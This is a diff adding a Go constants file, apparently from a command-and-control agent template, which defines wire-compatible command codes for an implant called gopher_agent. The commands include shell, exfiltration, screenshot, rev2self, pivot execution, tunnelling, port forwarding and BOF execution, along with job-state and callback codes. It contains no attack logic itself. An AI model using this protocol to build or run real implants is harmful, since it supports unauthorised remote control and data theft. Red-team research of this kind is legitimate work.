@@ -1,0 +1,102 @@
+package __PACKAGE__
+
+// ─── Command codes ─────────────────────────────────────────────────────────────
+// Wire-compatible with real gopher_agent. Values must match exactly.
+
+const (
+	COMMAND_ERROR      = 0
+	COMMAND_PWD        = 1
+	COMMAND_CD         = 2
+	COMMAND_SHELL      = 3
+	COMMAND_EXIT       = 4
+	COMMAND_DOWNLOAD   = 5
+	COMMAND_UPLOAD     = 6
+	COMMAND_CAT        = 7
+	COMMAND_CP         = 8
+	COMMAND_MV         = 9
+	COMMAND_MKDIR      = 10
+	COMMAND_RM         = 11
+	COMMAND_LS         = 12
+	COMMAND_PS         = 13
+	COMMAND_KILL       = 14
+	COMMAND_ZIP        = 15
+	COMMAND_SCREENSHOT = 16
+	COMMAND_RUN        = 17
+	COMMAND_JOB_LIST   = 18
+	COMMAND_JOB_KILL   = 19
+	COMMAND_REV2SELF   = 20
+
+	COMMAND_DISKS      = 21
+	COMMAND_EXFIL      = 22
+	COMMAND_GETUID     = 23
+	COMMAND_LINK       = 24
+	COMMAND_PROFILE    = 25
+	COMMAND_SLEEP      = 26
+	COMMAND_BURST      = 27
+	COMMAND_TERMINATE  = 28
+	COMMAND_UNLINK     = 29
+	COMMAND_PIVOT_EXEC = 30
+
+	COMMAND_TUNNEL_START   = 31
+	COMMAND_TUNNEL_STOP    = 32
+	COMMAND_TUNNEL_PAUSE   = 33
+	COMMAND_TUNNEL_RESUME  = 34
+	COMMAND_TUNNEL_REVERSE = 41
+
+	COMMAND_TERMINAL_START = 35
+	COMMAND_TERMINAL_STOP  = 36
+
+	COMMAND_LPORTFWD_START = 37
+	COMMAND_LPORTFWD_STOP  = 38
+	COMMAND_RPORTFWD_START = 39
+	COMMAND_RPORTFWD_STOP  = 40
+
+	COMMAND_EXEC_BOF       = 50
+	COMMAND_EXEC_BOF_OUT   = 51
+	COMMAND_EXEC_BOF_ASYNC = 52
+)
+
+// ─── Download states ───────────────────────────────────────────────────────────
+
+const (
+	DOWNLOAD_STATE_START    = 1
+	DOWNLOAD_STATE_CONTINUE = 2
+	DOWNLOAD_STATE_FINISH   = 3
+)
+
+// ─── Job types & states ────────────────────────────────────────────────────────
+
+const (
+	JOB_TYPE_LOCAL   = 0x1
+	JOB_TYPE_REMOTE  = 0x2
+	JOB_TYPE_PROCESS = 0x3
+	JOB_TYPE_SHELL   = 0x4
+	JOB_TYPE_BOF     = 0x5
+)
+
+const (
+	JOB_STATE_STARTING = 0x0
+	JOB_STATE_RUNNING  = 0x1
+	JOB_STATE_FINISHED = 0x2
+	JOB_STATE_KILLED   = 0x3
+)
+
+// ─── BOF callback & error codes ────────────────────────────────────────────────
+
+const (
+	CALLBACK_OUTPUT      = 0x0
+	CALLBACK_OUTPUT_OEM  = 0x1e
+	CALLBACK_OUTPUT_UTF8 = 0x20
+	CALLBACK_ERROR       = 0x0d
+	CALLBACK_CUSTOM      = 0x1000
+	CALLBACK_CUSTOM_LAST = 0x13ff
+
+	CALLBACK_AX_SCREENSHOT   = 0x81
+	CALLBACK_AX_DOWNLOAD_MEM = 0x82
+
+	BOF_ERROR_PARSE     = 0x101
+	BOF_ERROR_SYMBOL    = 0x102
+	BOF_ERROR_MAX_FUNCS = 0x103
+	BOF_ERROR_ENTRY     = 0x104
+	BOF_ERROR_ALLOC     = 0x105
+)
